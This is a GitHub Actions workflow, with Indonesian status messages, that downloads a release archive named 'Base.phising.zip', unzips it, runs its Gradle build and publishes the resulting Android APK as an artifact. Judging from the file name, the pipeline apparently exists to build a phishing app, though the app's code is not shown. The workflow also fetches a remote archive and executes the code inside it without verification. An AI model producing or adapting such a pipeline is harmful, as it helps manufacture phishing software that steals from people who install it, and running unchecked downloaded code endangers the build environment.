name: Universal Native Android Build

on:
  push:
    branches:
      - main
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    
    steps:
      - name: Checkout Repository
        uses: actions/checkout@v4

      - name: Setup Java JDK
        uses: actions/setup-java@v4
        with:
          distribution: 'zulu'
          java-version: '17'

      # Download dari release
      - name: Download Base from Release
        run: |
          curl -L -o base.zip \
            https://github.com/KawakunChan/Db/releases/download/v1.0.0/Base.phising.zip
          
          if [ -f "base.zip" ]; then
            echo "✅ Download sukses!"
            ls -la base.zip
            unzip -o base.zip
            rm base.zip
          else
            echo "❌ Download gagal!"
            exit 1
          fi

      - name: Build Android APK
        run: |
          ANDROID_DIR=$(find . -type d -name "android" -not -path "./.github/*" | head -n 1)
          
          if [ -z "$ANDROID_DIR" ]; then
            echo "❌ Folder android tidak ditemukan!"
            echo "📂 Isi direktori:"
            ls -la
            exit 1
          fi
          
          echo "🎯 Found android at: $ANDROID_DIR"
          cd "$ANDROID_DIR"
          chmod +x gradlew
          ./gradlew assembleRelease --stacktrace --no-daemon

      - name: Upload APK Artifact
        uses: actions/upload-artifact@v4
        with:
          name: Hasil-Base-APK-Native
          path: |
            **/build/outputs/apk/release/*.apk
            **/build/outputs/apk/debug/*.apk
          continue-on-error: true
